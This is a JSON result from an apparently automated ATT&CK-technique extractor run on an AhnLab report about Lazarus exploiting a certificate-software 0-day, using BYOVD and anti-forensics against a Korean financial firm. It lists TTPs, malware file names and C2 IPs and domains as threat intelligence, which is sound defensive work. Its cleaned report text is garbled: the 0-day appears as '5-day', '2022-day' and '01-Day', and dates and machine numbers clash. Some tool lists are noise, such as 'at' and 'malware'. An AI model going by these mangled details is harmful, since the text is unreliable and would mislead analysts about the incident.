{
  "status": "success",
  "mode": "langchain",
  "extraction": {
    "status": "success",
    "extraction_summary": {
      "reports_processed": 1,
      "total_ttps_extracted": 29,
      "langchain_extractions": 1,
      "high_confidence_ttps": 0,
      "processing_time_ms": 7435.996
    },
    "extraction_results": [
      {
        "report_id": "pdf-f0b77b494f77b4cf56ff772a1e5578af",
        "extracted_ttps": [
          {
            "ttp_id": "bba25381-6130-4151-9d90-0bb39e54a70d",
            "report_id": "pdf-f0b77b494f77b4cf56ff772a1e5578af",
            "technique_name": "Lateral Movement",
            "attack_id": "T1021",
            "tactic": "Lateral Movement",
            "description": "Lateral movement using 0-Day vulnerability of company A's certificate program",
            "confidence_score": 0.726,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.23,
              "tool_mentions": 1.0,
              "context_richness": 0.96,
              "multiple_sources": 0.5
            },
            "indicators": [
              "0-Day vulnerability",
              "company A's certificate program"
            ],
            "tools": [
              "at",
              "PING",
              "reg",
              "malware",
              "msiexec",
              "sc",
              "net",
              "ftp",
              "cmd"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "d341151e-6e69-438a-be75-243a09a5038c",
            "report_id": "pdf-f0b77b494f77b4cf56ff772a1e5578af",
            "technique_name": "Anti-Forensics",
            "attack_id": "T1112",
            "tactic": "Defense Evasion",
            "description": "Anti-forensics and timestamp operation",
            "confidence_score": 0.705,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.092,
              "tool_mentions": 1.0,
              "context_richness": 0.96,
              "multiple_sources": 0.5
            },
            "indicators": [
              "anti-forensics",
              "timestamp operation"
            ],
            "tools": [
              "at",
              "PING",
              "reg",
              "malware",
              "msiexec",
              "sc",
              "net",
              "ftp",
              "cmd"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "ba849ac3-5f71-40ba-bfa7-765e151eb3b7",
            "report_id": "pdf-f0b77b494f77b4cf56ff772a1e5578af",
            "technique_name": "Command and Scripting Interpreter",
            "attack_id": "T1059",
            "tactic": "Execution",
            "description": "Use of command line tools such as PING, at, cmd, net, reg",
            "confidence_score": 0.687,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.7,
              "description_detail": 0.276,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "PING",
              "at",
              "cmd",
              "net",
              "reg"
            ],
            "tools": [
              "at",
              "PING",
              "reg",
              "sc",
              "msiexec",
              "net",
              "ftp",
              "cmd"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "697d573e-2d1f-4932-a47a-88784943cbef",
            "report_id": "pdf-f0b77b494f77b4cf56ff772a1e5578af",
            "technique_name": "Exploitation for Privilege Escalation",
            "attack_id": "T1068",
            "tactic": "Privilege Escalation",
            "description": "The attackers took advantage of a 0-Day vulnerability in the public certificate software to escalate privileges",
            "confidence_score": 0.683,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.368,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "0-Day vulnerability",
              "public certificate software"
            ],
            "tools": [
              "at",
              "PING",
              "reg",
              "malware",
              "msiexec",
              "sc",
              "net",
              "ftp",
              "cmd"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "af5e227c-3290-462a-b4cf-c2c8143ebbd6",
            "report_id": "pdf-f0b77b494f77b4cf56ff772a1e5578af",
            "technique_name": "Disable or Evade Security Tools",
            "attack_id": "T1562.001",
            "tactic": "Defense Evasion",
            "description": "The attackers defeated the security product using a technique called BYOVD, which exploits a vulnerable driver kernel module",
            "confidence_score": 0.68,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.9,
              "ioc_evidence": 0.58,
              "description_detail": 0.414,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "BYOVD",
              "vulnerable driver kernel module"
            ],
            "tools": [
              "at",
              "PING",
              "reg",
              "malware",
              "msiexec",
              "sc",
              "net",
              "ftp",
              "cmd"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "33a44086-54a7-45ff-aff6-5f9ab536e147",
            "report_id": "pdf-f0b77b494f77b4cf56ff772a1e5578af",
            "technique_name": "Exploitation of Public-Facing Application",
            "attack_id": "T1190",
            "tactic": "Initial Access",
            "description": "Lazarus attack group exploited a public certificate software vulnerability widely used by public institutions and universities",
            "confidence_score": 0.677,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.368,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "asec.ahnlab.com/ko/48416"
            ],
            "tools": [
              "at",
              "PING",
              "Malware",
              "reg",
              "sc",
              "msiexec",
              "net",
              "ftp",
              "cmd"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "03715787-5dbd-4bc4-8341-26af0cf2827a",
            "report_id": "pdf-f0b77b494f77b4cf56ff772a1e5578af",
            "technique_name": "Masquerading",
            "attack_id": "T1036",
            "tactic": "Defense Evasion",
            "description": "Use the same file name as the system file name to masquerade as a legitimate file",
            "confidence_score": 0.677,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.368,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "system file name masquerading"
            ],
            "tools": [
              "at",
              "PING",
              "reg",
              "malware",
              "msiexec",
              "sc",
              "net",
              "ftp",
              "cmd"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "54e1c24e-583b-4153-ae73-2cf486f118cc",
            "report_id": "pdf-f0b77b494f77b4cf56ff772a1e5578af",
            "technique_name": "Exploitation for Client Execution",
            "attack_id": "T1203",
            "tactic": "Execution",
            "description": "Exploitation of certificate software vulnerabilities",
            "confidence_score": 0.657,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.66,
              "description_detail": 0.115,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "certificate software vulnerability",
              "AppCrash",
              "svchost.exe",
              "ftp.exe"
            ],
            "tools": [
              "at",
              "PING",
              "ftp.exe",
              "reg",
              "sc",
              "msiexec",
              "svchost.exe",
              "ftp",
              "net",
              "cmd"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "7abee364-2169-4717-9802-46c6e6fff48d",
            "report_id": "pdf-f0b77b494f77b4cf56ff772a1e5578af",
            "technique_name": "Indicator Removal",
            "attack_id": "T1070",
            "tactic": "Defense Evasion",
            "description": "Deletion of Prefetch files and crash dump files",
            "confidence_score": 0.656,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.184,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "Prefetch files",
              "crash dump files"
            ],
            "tools": [
              "at",
              "PING",
              "reg",
              "sc",
              "msiexec",
              "svchost.exe",
              "ftp",
              "net",
              "cmd"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "2254ec56-c151-4b9f-93a2-3d05a0a883e7",
            "report_id": "pdf-f0b77b494f77b4cf56ff772a1e5578af",
            "technique_name": "Indicator Removal",
            "attack_id": "T1070.004",
            "tactic": "Defense Evasion",
            "description": "Deletion of malicious files",
            "confidence_score": 0.656,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.9,
              "ioc_evidence": 0.74,
              "description_detail": 0.092,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "sfbappsdk.dll",
              "fswss.exe",
              "fmSysN.exe",
              "skypeserver.exe",
              "perlcritic.exe",
              "perlcritic64.exe"
            ],
            "tools": [
              "at",
              "PING",
              "reg",
              "sc",
              "msiexec",
              "svchost.exe",
              "ftp",
              "net",
              "cmd"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "2c70d694-24a1-4320-bcb0-35c244a82a51",
            "report_id": "pdf-f0b77b494f77b4cf56ff772a1e5578af",
            "technique_name": "Exploitation of Remote Services",
            "attack_id": "T1210",
            "tactic": "Lateral Movement",
            "description": "Exploitation of certificate software vulnerabilities for lateral movement",
            "confidence_score": 0.656,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.184,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "certificate software vulnerability",
              "svchost.exe"
            ],
            "tools": [
              "at",
              "PING",
              "reg",
              "sc",
              "msiexec",
              "svchost.exe",
              "ftp",
              "net",
              "cmd"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "72fcc7d8-f1e2-4a3c-abbb-da16bb805a7f",
            "report_id": "pdf-f0b77b494f77b4cf56ff772a1e5578af",
            "technique_name": "Web Service Exploitation",
            "attack_id": "T1102",
            "tactic": "Command and Control",
            "description": "Use of legitimate domains as C2 servers",
            "confidence_score": 0.652,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.161,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "C2 server domains",
              "legitimate domains"
            ],
            "tools": [
              "skypeserver.exe",
              "at",
              "PING",
              "reg",
              "sc",
              "msiexec",
              "svchost.exe",
              "ftp",
              "net",
              "cmd"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "df310818-5acd-4f4a-b2ed-7e3176e3cc30",
            "report_id": "pdf-f0b77b494f77b4cf56ff772a1e5578af",
            "technique_name": "File Deletion",
            "attack_id": "T1070.004",
            "tactic": "Defense Evasion",
            "description": "Delete execution artifacts and change the file name randomly",
            "confidence_score": 0.649,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.9,
              "ioc_evidence": 0.58,
              "description_detail": 0.207,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "file deletion",
              "random file name change"
            ],
            "tools": [
              "at",
              "PING",
              "reg",
              "malware",
              "msiexec",
              "sc",
              "net",
              "ftp",
              "cmd"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "db098f08-2e54-4504-a9b1-61ef5fc49e1e",
            "report_id": "pdf-f0b77b494f77b4cf56ff772a1e5578af",
            "technique_name": "Software Deployment Tools",
            "attack_id": "T1072",
            "tactic": "Execution",
            "description": "Loader and malware deployment",
            "confidence_score": 0.648,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.62,
              "description_detail": 0.092,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "conti",
              "loader",
              "malware"
            ],
            "tools": [
              "conti",
              "loader",
              "at",
              "PING",
              "reg",
              "malware",
              "msiexec",
              "sc",
              "net",
              "ftp",
              "cmd"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "c14cc87a-0e9c-4117-899c-237a69690dff",
            "report_id": "pdf-f0b77b494f77b4cf56ff772a1e5578af",
            "technique_name": "Application Layer Protocol",
            "attack_id": "T1071.001",
            "tactic": "Command and Control",
            "description": "Use of web protocols for C2 communication",
            "confidence_score": 0.648,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.9,
              "ioc_evidence": 0.58,
              "description_detail": 0.199,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "C2 server communication",
              "web protocols"
            ],
            "tools": [
              "skypeserver.exe",
              "at",
              "PING",
              "reg",
              "sc",
              "msiexec",
              "svchost.exe",
              "ftp",
              "net",
              "cmd"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "3158034a-e54f-4c31-9192-1009adb5fc4e",
            "report_id": "pdf-f0b77b494f77b4cf56ff772a1e5578af",
            "technique_name": "Command and Scripting Interpreter",
            "attack_id": "T1059.003",
            "tactic": "Execution",
            "description": "Use of Windows Command Shell to run perlcritic.exe",
            "confidence_score": 0.646,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.9,
              "ioc_evidence": 0.58,
              "description_detail": 0.184,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "cmd.exe",
              "perlcritic.exe"
            ],
            "tools": [
              "cmd.exe",
              "at",
              "PING",
              "reg",
              "sc",
              "perlcritic.exe",
              "msiexec",
              "net",
              "ftp",
              "cmd"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "08e0901d-1678-4832-87c5-e87bf752be2b",
            "report_id": "pdf-f0b77b494f77b4cf56ff772a1e5578af",
            "technique_name": "Exploitation for Privilege Escalation",
            "attack_id": "T1068",
            "tactic": "Privilege Escalation",
            "description": "Use of PROCEXP152.sys for privilege escalation",
            "confidence_score": 0.643,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.138,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "PROCEXP152.sys"
            ],
            "tools": [
              "at",
              "PING",
              "reg",
              "sc",
              "msiexec",
              "PROCEXP152.sys",
              "net",
              "ftp",
              "cmd"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "ef85d929-a23e-4af8-9178-49bcc3fb20ab",
            "report_id": "pdf-f0b77b494f77b4cf56ff772a1e5578af",
            "technique_name": "Network Service Discovery",
            "attack_id": "T1046",
            "tactic": "Discovery",
            "description": "Use of fswss.exe for network discovery",
            "confidence_score": 0.643,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.138,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "fswss.exe"
            ],
            "tools": [
              "at",
              "fswss.exe",
              "PING",
              "reg",
              "sc",
              "msiexec",
              "net",
              "ftp",
              "cmd"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "78ae8d8f-d6bf-45ed-9ef8-5e2029f42f8a",
            "report_id": "pdf-f0b77b494f77b4cf56ff772a1e5578af",
            "technique_name": "Create or Modify System Process",
            "attack_id": "T1543",
            "tactic": "Persistence",
            "description": "Detected Create or Modify System Process activity via NLP pattern matching",
            "confidence_score": 0.64,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.246,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "at",
              "PING",
              "reg",
              "sc",
              "msiexec",
              "net",
              "ftp",
              "cmd"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "c1cf319b-81d0-48ef-880b-24e9182dfc9e",
            "report_id": "pdf-f0b77b494f77b4cf56ff772a1e5578af",
            "technique_name": "Impair Defenses",
            "attack_id": "T1562.001",
            "tactic": "Defense Evasion",
            "description": "Disable or modify V3 security product",
            "confidence_score": 0.639,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.9,
              "ioc_evidence": 0.58,
              "description_detail": 0.138,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "V3",
              "Exploit/Win.Lazardoor.GEN"
            ],
            "tools": [
              "at",
              "PING",
              "Exploit/Win.Lazardoor.GEN",
              "reg",
              "sc",
              "msiexec",
              "net",
              "ftp",
              "cmd"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "8251a868-8fec-42aa-b982-1e18faf372db",
            "report_id": "pdf-f0b77b494f77b4cf56ff772a1e5578af",
            "technique_name": "Process Injection",
            "attack_id": "T1055",
            "tactic": "Defense Evasion",
            "description": "Detected Process Injection activity via NLP pattern matching",
            "confidence_score": 0.636,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.214,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "at",
              "PING",
              "reg",
              "sc",
              "msiexec",
              "net",
              "ftp",
              "cmd"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "a1d5ec56-6075-419f-b718-941821f4aec6",
            "report_id": "pdf-f0b77b494f77b4cf56ff772a1e5578af",
            "technique_name": "Application Layer Protocol",
            "attack_id": "T1071",
            "tactic": "Command And Control",
            "description": "Detected Application Layer Protocol activity via NLP pattern matching",
            "confidence_score": 0.633,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.199,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "at",
              "PING",
              "reg",
              "sc",
              "msiexec",
              "net",
              "ftp",
              "cmd"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "07f9fd66-bfae-49d8-99b2-f3243e4c322c",
            "report_id": "pdf-f0b77b494f77b4cf56ff772a1e5578af",
            "technique_name": "Command and Scripting Interpreter",
            "attack_id": "T1059",
            "tactic": "Execution",
            "description": "Detected Command and Scripting Interpreter activity via NLP pattern matching",
            "confidence_score": 0.631,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.185,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "at",
              "PING",
              "reg",
              "sc",
              "msiexec",
              "net",
              "ftp",
              "cmd"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "f1300286-6f95-4d57-b1f1-9aab54deb180",
            "report_id": "pdf-f0b77b494f77b4cf56ff772a1e5578af",
            "technique_name": "Command and Control",
            "attack_id": "T1071",
            "tactic": "Command and Control",
            "description": "C2 communication",
            "confidence_score": 0.629,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.046,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "C2 communication"
            ],
            "tools": [
              "at",
              "PING",
              "reg",
              "malware",
              "msiexec",
              "sc",
              "net",
              "ftp",
              "cmd"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "57596d7a-fb07-4d3b-9303-590d25be1293",
            "report_id": "pdf-f0b77b494f77b4cf56ff772a1e5578af",
            "technique_name": "Exploit Public-Facing Application",
            "attack_id": "T1190",
            "tactic": "Initial Access",
            "description": "Detected Exploit Public-Facing Application activity via NLP pattern matching",
            "confidence_score": 0.628,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.162,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "at",
              "PING",
              "reg",
              "sc",
              "msiexec",
              "net",
              "ftp",
              "cmd"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "5e3c8a86-ac12-406e-9a84-46dae5bdc1ec",
            "report_id": "pdf-f0b77b494f77b4cf56ff772a1e5578af",
            "technique_name": "Network Service Discovery",
            "attack_id": "T1046",
            "tactic": "Discovery",
            "description": "Detected Network Service Discovery activity via NLP pattern matching",
            "confidence_score": 0.628,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.162,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "at",
              "PING",
              "reg",
              "sc",
              "msiexec",
              "net",
              "ftp",
              "cmd"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "33c41cff-e13a-44cb-9f46-06701b92c1f6",
            "report_id": "pdf-f0b77b494f77b4cf56ff772a1e5578af",
            "technique_name": "Archive Collected Data",
            "attack_id": "T1560",
            "tactic": "Collection",
            "description": "Detected Archive Collected Data activity via NLP pattern matching",
            "confidence_score": 0.628,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.162,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "at",
              "PING",
              "reg",
              "sc",
              "msiexec",
              "net",
              "ftp",
              "cmd"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "3872124e-d3fb-4d89-89b8-7c4b559776f9",
            "report_id": "pdf-f0b77b494f77b4cf56ff772a1e5578af",
            "technique_name": "Indicator Removal",
            "attack_id": "T1070.006",
            "tactic": "Defense Evasion",
            "description": "Timestomping of malicious files",
            "confidence_score": 0.626,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.9,
              "ioc_evidence": 0.54,
              "description_detail": 0.092,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "malicious file timestamps"
            ],
            "tools": [
              "at",
              "PING",
              "reg",
              "sc",
              "msiexec",
              "svchost.exe",
              "ftp",
              "net",
              "cmd"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "57e1d081-21d2-48c3-af23-ef5c60ec12ee",
            "report_id": "pdf-f0b77b494f77b4cf56ff772a1e5578af",
            "technique_name": "Remote Services",
            "attack_id": "T1021",
            "tactic": "Lateral Movement",
            "description": "Detected Remote Services activity via NLP pattern matching",
            "confidence_score": 0.624,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.139,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "at",
              "PING",
              "reg",
              "sc",
              "msiexec",
              "net",
              "ftp",
              "cmd"
            ],
            "extraction_method": "nlp_indicator"
          }
        ],
        "nlp_analysis": {
          "processed_text": {
            "cleaned_text": "1 / 1 6 nuno Feb 2023  2 Lazarus attack group attack case using public certificate softwarevulnerability widely used by public institutions and universities asec.ahnlab.com/ko/48416 Since last year (March 2021)  the Lazarus attack group s malware has been found in a number of domestic companies such as defense  satellite  software  and media companies  and the AhnLab Security Emergency Response Center (ASEC) has been continuously tracking and analyzing the activities of the Lazarus attack group and related malware. The affected customer in this case had already been breached once by the Lazarus attack group in May 2022  and the breach recurred due to a 5-day vulnerability in the same software. At the time of the May 0 breach  the customer was using a weak version of the certificate-related program widely used in public institutions and universities  and all the software was updated to the latest version after the accident. This time  however  it was breached by a 2022-day vulnerability in the software. ASEC has reported the software to KISA  but the vulnerability has not been clearly identified  and the manufacturer and software are not disclosed in this article because no software patch has been released yet. In addition to this incident  the Lazarus Group is continuously researching various software vulnerabilities to infiltrate domestic institutions and companies  and is continuously changing TTP by disabling security products  and using anti- forensic technologies to hinder and delay detection and analysis. This report is based on the victim s forensic analysis report. The report was prepared in January  but after delaying disclosure due to software vulnerability patching issues  the company decided to release the software information after anonymizing it. When a software patch is released  we will redistribute a report of the version that released the information. Outline of the incident CATEGORY DESCRIPTION Duration ofthe incident2022/10/21   2022/11/18 CustomerType Financial Business DamageSystemType Windows 10 DamageStatus Backdoor malware infection and C2 communication Types ofattacks Lateral movement using 0-Day vulnerability of company A s certificate program   Since the patch has not yet been released  vulnerable software information is notdisclosedDisabling vaccines through BYOVD attacksAnti-forensicsTimestamp operationChange the file name randomly and delete itDelete execution artifactsUse the same file name as the system file name assailantLazarus 2 / 1 6 IncidentTAG  Lazarus  skypeserver.exe  0-day   \ub8e8\ud2b8\ud0b7  BYOVD [table] analysis summary [Figure] Infringement Flow Chart Lessons from examples The attackers took advantage of a 0-Day vulnerability in the public certificate software widely used in the country. This type of software does not update automatically  so be sure to patch the latest version of your software and uninstall it if you are not using it. The attackers defeated the security product using a technique called BYOVD  which exploits a vulnerable driver kernel module. The attackers performed anti-forensic acts  such as changing and deleting files to conceal malicious behavior  or manipulating time information. The victim was re-breached by the same attacker in a similar way. In addition to reactive measures  continuous monitoring must prevent the threat from recurring. Case Details 3 / 1 6 Summary of analysis results After analyzing the two PCs received from the customer  it was confirmed that PC01 and PC02 were subjected to lateral movement attacks using vulnerabilities in the certificate software. PC02 was attacked from an unidentified internal system on October 10  and PC21 was attacked by PC01 on November 11. Given that PC18 and PC02 had the latest version of certificate software installed  it is believed that the attacker used a 01-Day vulnerability. In addition  PC02 and PC0 experienced V01 incapacitation on November 02  but a different method was used. The system analyzed this time was subjected to a lateral movement attack and was not related to the initial influx of attackers. It is believed that the victim s Internet network was threatened by the Lazarus attack group  which successfully broke in in May. SYSTEMDATE DESCRIPTION PC01 2022/11/18Lateral movement attack due to certificate softwarevulnerability ( PC02   PC01 ) 2022/11/18V3 Disabling Occurs PC02 2022/10/21Lateral movement attack due to certificate softwarevulnerability ( unknown internalsystem   PC02 ) 2022/11/18V3 Disabling Occurs [Table] Major malicious actions by each system PC01 Analysis PC01 is believed to have been compromised by a 2022-Day vulnerability attack in certificate software on 11/18/10 00:35:0. Three network connection attempts were made from PC02 to the service TCP port of PC01 s certificate software. In the previous two connections  there was no special response from PC01  but when PC02 accessed PC11 at 18:10 on 00/01 using skypeserver.exe (unsecured) created using svchost.exe  PC01 encountered an error (AppCrash) in the certificate software  and malicious actions began thereafter. When AppCrash occurred  all error reports (WARs) and memory dump files stored in the system were deleted and could not be checked. It appears to have been intentionally deleted by the attackers. DATETIME DESCRIPTION REMARKS 2022/11/1516:18:52svchost.exe networkconnection10.20.XXX.125:XXXXX Presumedto be anattackfailure orconnectiontest 2022/11/189:49:31 svchost.exe networkconnection10.20.XXX.125:XXXXX Presumedto be anattackfailure orconnectiontest 2022/11/1810:00:27network connection .exeskypeserver10.20.XXX.125:XXXXX Successfulexploits [Table] History of access from PC02 to certificate software service port of PC01 (V3 behavior log) 4 / 1 6 [Figure] Record of Crashdump File Generation in Certificate Software Among the traces identified in PC01  the difference from the attack that occurred in May is that the process used after the vulnerability attack in the certificate software was svchost.exe rather than ftp .exe  and the vulnerable version of the software was installed at the time  but this time all the latest versions were installed  so there is no known vulnerability information. TARGETINSTALLDATE SOFTWAREVERSIONCOMPROMISEDDATE PC01 2022/07/01Up-to-date2022/11/18 PC02 2022/08/30Up-to-date2022/10/21 [table] Certificate software versions installed on PC01 and PC02 After accessing PC01  the attacker injected a malicious thread into a normal process (svchost.exe) and used it for C2 communication and backdoor. It then neutralized the V3 product installed on the system  and created and executed additional malicious files. In addition  in this analysis  traces of manipulation of the timestamp of malicious files were confirmed  and anti-forensic behaviors such as randomly changing and deleting file names when deleting files were found  so it seems that attackers are actively interfering with the analysis. TIMELINE (PC01) The timeline of the infringement identified in PC01 is as follows: TIME (22/11/18)CATEGORY BEHAVIORS 10:00:37injection svchost.exe injects a malicious thread into a running process to start malicious activity 5 / 1 6 10:00:37C2communicationsvchost.exe connects to the attacker s C2 address 121.78.246.155(dalbinews.co.kr) 10:10:01Malicious filecreation Malicious file creation C:\\ProgramData\\tszui.tmp (unsecured) 10:17:55Anti-forensicsRename and delete malicious files Rename: C:\\ProgramData\\tszui.tmp -  Delete phqghumeaFile :C:\\ProgramData\\phqghumea (unsecured) 10:18:47C2communicationsvchost.exe connects to the attacker C2 address 121.78.158.46 (www.studyholic.com) 10:20:28Neutralizesecurityproducts V3 detects security product incapacitation (Exploit/Win.Lazardoor.GEN) 10:20:24C2communicationNetwork connection to attacker C2 183.110.224.172 (ctmnews.kr) 10:27:58Malicious filecreation Malicious file creation C:\\ProgramData\\perlcritic.exe (unsecured) 10:28:53Generatevulnerabledriver files Malicious file execution C:\\ProgramData\\perlcritic.exe (unsecured)Driver file creation (not malicious)C\\Windows\\System32\\drivers\\PROCEXP152.SYS (secured) 10:29:16Malicious filecreation Malicious 